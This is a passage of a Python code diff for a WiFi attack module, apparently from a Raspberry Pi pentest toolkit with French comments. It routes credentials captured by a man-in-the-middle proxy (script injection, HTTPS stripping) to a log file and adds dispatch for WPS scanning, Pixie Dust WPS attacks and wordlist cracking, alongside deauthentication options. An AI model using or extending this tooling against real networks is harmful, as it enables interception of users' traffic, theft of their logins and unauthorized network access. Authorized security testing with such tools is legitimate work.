+                    inj_env["NEXUSPI_CRED_LOG"] = str(portal_log)
                     _log(f"Proxy HTTP activé (inject={bool(inject_script.strip())}, "
                          f"strip_https={strip_https == 'yes'})")
                     procs.append(subprocess.Popen(
@@ -1256,6 +1890,7 @@ class WifiModule(BaseModule):
                 mitm_env = os.environ.copy()
                 mitm_env["NEXUSPI_INJECT"] = inject_script
                 mitm_env["NEXUSPI_STRIP_HTTPS"] = "1" if strip_https == "yes" else ""
+                mitm_env["NEXUSPI_CRED_LOG"] = str(portal_log)
                 _log(f"Lancement mitmdump (inject={bool(inject_script)}, "
                      f"strip_https={strip_https == 'yes'})")
                 # Ignore les hosts qui font des probes de connectivité OS — ils
@@ -1875,7 +2510,7 @@ class WifiModule(BaseModule):
 
         try:
             while time.time() - start < duration + 30:
-                if task and task._stop_event and task._stop_event.is_set():
+                if task and task.is_stopped():
                     _log("Stop demandé", "warn")
                     proc.terminate()
                     break
@@ -1994,7 +2629,7 @@ class WifiModule(BaseModule):
 
             lines_count = 0
             while time.time() - start < duration:
-                if task and task._stop_event and task._stop_event.is_set():
+                if task and task.is_stopped():
                     _log("Stop demandé", "warn")
                     break
                 # Lecture non-bloquante des lignes mdk4
@@ -2127,6 +2762,21 @@ class WifiModule(BaseModule):
                     deauth_continuous=str(params.get("deauth_continuous", "no")),
                     deauth_target_client=str(params.get("deauth_target_client", "")),
                 )
+            if action_id == "wps_scan":
+                return self._wps_scan(max(5, min(60, duration)))
+            if action_id == "pixie_dust":
+                target_wps = str(params.get("target", "_all"))
+                try:
+                    tout = int(params.get("timeout", 120))
+                except (TypeError, ValueError):
+                    tout = 120
+                return self._pixie_dust(target_wps, max(30, min(600, tout)))
+            if action_id == "crack":
+                wordlist = str(params.get("wordlist",
+                               "/usr/share/wordlists/fasttrack.txt"))
+                if wordlist == "_custom":
+                    wordlist = str(params.get("wordlist_custom", ""))
+                return self._crack(bssid, wordlist)
             return {"ok": True, "stub": True, "iface": iface,
                     "message": f"[stub] '{action_id}' prêt."}
         except Exception as e:
